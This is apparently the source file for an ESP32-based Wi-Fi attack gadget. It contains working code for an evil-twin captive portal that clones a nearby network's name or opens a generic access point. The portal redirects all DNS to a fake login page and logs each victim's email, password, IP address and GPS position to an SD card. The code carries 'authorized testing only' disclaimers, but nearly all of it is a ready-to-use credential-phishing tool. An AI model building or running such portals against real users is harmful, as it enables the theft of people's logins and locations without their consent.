// AWOKxDAG — evil / captive portal (compiled as part of the sketch; see awok_common.h)

// ---- Evil / captive portal ----------------------------------------------

// SoftAP SSID for the portal: the default open name, or a cloned target SSID
// when launched as an evil twin.
String portalSsid;

// A deliberately generic login page — it does not imitate any real brand,
// service, or router vendor. For authorized social-engineering assessments.
const char kPortalPage[] = R"HTML(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Login</title><style>
body{font-family:sans-serif;background:#eceff1;margin:0;padding:36px}
.card{max-width:340px;margin:auto;background:#fff;padding:24px;border-radius:10px;
box-shadow:0 2px 8px rgba(0,0,0,.15)}h2{margin:0 0 6px}p{color:#555}
input{width:100%;box-sizing:border-box;padding:11px;margin:8px 0;border:1px solid #ccc;
border-radius:6px}button{width:100%;padding:12px;border:0;border-radius:6px;
background:#1976d2;color:#fff;font-size:16px}</style></head><body><div class="card">
<h2>Wi-Fi Login</h2><p>Sign in to connect to the internet.</p>
<form method="POST" action="/login">
<input name="email" placeholder="Email"><input name="password" type="password"
placeholder="Password"><button>Connect</button></form></div></body></html>)HTML";

bool openPortalLog() {
  if (!ensureSdCard()) return false;
  if (!SD.exists(kPortalCredsPath)) {
    File file = SD.open(kPortalCredsPath, FILE_WRITE);
    if (!file) {
      sdReady = false;
      return false;
    }
    file.println("uptime_ms,client_ip,latitude,longitude,altitude_m,fields");
    file.close();
  }
  return true;
}

void handlePortalRoot() {
  portalServer.send(200, "text/html", kPortalPage);
}

void handlePortalLogin() {
  String line = String(millis());
  line += ',';
  line += portalServer.client().remoteIP().toString();
  line += gpsCsvFields();
  for (int i = 0; i < portalServer.args(); ++i) {
    line += ',';
    line += portalServer.argName(i);
    line += '=';
    line += portalServer.arg(i);
  }
  if (portalLogReady) {
    File file = SD.open(kPortalCredsPath, FILE_APPEND);
    if (file) {
      file.println(line);
      file.close();
    } else {
      portalLogReady = false;
      sdReady = false;
    }
  }
  ++portalCredsCount;
  lastPortalCred =
      portalServer.arg("email") + " / " + portalServer.arg("password");
  Serial.printf("[portal] captured: %s\n", line.c_str());
  portalServer.send(200, "text/html",
                    "<html><body style='font-family:sans-serif;padding:40px'>"
                    "<h3>Connecting...</h3><p>Please wait.</p></body></html>");
}

void handlePortalNotFound() {
  // Captive-portal redirect: bounce every other request to the login page.
  portalServer.sendHeader("Location", String("http://") + portalIp.toString(),
                          true);
  portalServer.send(302, "text/plain", "");
}

void drawEvilPortal() {
  currentView = View::kEvilPortal;
  display.fillScreen(kBackground);
  drawHeader("EVIL PORTAL",
             evilPortalActive ? "AP + captive portal up" : "stopped");
  display.setTextSize(2);
  display.setTextColor(evilPortalActive ? kBad : kMuted, kBackground);
  display.setCursor(6, 54);
  display.print(evilPortalActive ? "SERVING" : "IDLE");

  display.setTextSize(1);
  display.setTextColor(ILI9341_WHITE, kBackground);
  display.setCursor(6, 90);
  display.print("SSID: ");
  display.print(portalSsid.length() ? portalSsid : String(kPortalSsid));
  display.setCursor(6, 104);
  display.print("Portal IP: ");
  display.print(evilPortalActive ? portalIp.toString() : String("-"));
  display.setCursor(6, 118);
  display.printf("Clients: %d",
                 evilPortalActive ? WiFi.softAPgetStationNum() : 0);
  display.setTextColor(portalCredsCount ? kGood : kMuted, kBackground);
  display.setCursor(6, 132);
  display.printf("Captured: %lu", static_cast<unsigned long>(portalCredsCount));
  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 146);
  display.print("Last: ");
  display.print(lastPortalCred.length() ? clipped(lastPortalCred, 30)
                                        : String("none"));

  display.drawFastHLine(6, 164, 228, kPanel);
  display.setTextColor(portalLogReady ? kAccent : kWarn, kBackground);
  display.setCursor(6, 172);
  display.print(portalLogReady ? "SD: portal_creds.csv" : "SD unavailable");
  display.setTextColor(kBad, kBackground);
  display.setCursor(6, 192);
  display.print("Authorized testing only.");
  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 208);
  display.print("Only stand this up against users");
  display.setCursor(6, 220);
  display.print("who consented to the assessment.");
  drawFooter("Back", "Clear");
}

void startEvilPortal() {
  if (portalSsid.length() == 0) portalSsid = kPortalSsid;
  portalCredsCount = 0;
  lastPortalCred = "";
  evilPortalStartMs = millis();
  lastPortalDrawMs = 0;
  signalMonitorActive = false;

  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(portalSsid.c_str());
  delay(100);
  portalIp = WiFi.softAPIP();
  portalDns.start(53, "*", portalIp);
  portalServer.on("/", handlePortalRoot);
  portalServer.on("/login", HTTP_POST, handlePortalLogin);
  portalServer.onNotFound(handlePortalNotFound);
  portalServer.begin();
  portalLogReady = openPortalLog();
  evilPortalActive = true;
  Serial.printf("[portal] AP '%s' up at %s\n", portalSsid.c_str(),
                portalIp.toString().c_str());
  drawEvilPortal();
}

// Plain open portal with the default SSID.
void startEvilPortalPlain() {
  portalSsid = kPortalSsid;
  startEvilPortal();
}

// Evil twin: clone the last-selected Wi-Fi network's SSID as an open AP.
void startEvilTwin() {
  portalSsid = selectedWifi.ssid.length() ? selectedWifi.ssid
                                          : String(kPortalSsid);
  startEvilPortal();
}

void stopEvilPortal() {
  evilPortalActive = false;
  portalServer.stop();
  portalDns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, false);
  Serial.println("[portal] stopped");
}

void updateEvilPortal() {
  if (!evilPortalActive) return;
  portalDns.processNextRequest();
  portalServer.handleClient();
  if (currentView == View::kEvilPortal &&
      millis() - lastPortalDrawMs >= kPortalRedrawMs) {
    lastPortalDrawMs = millis();
    drawEvilPortal();
  }
}

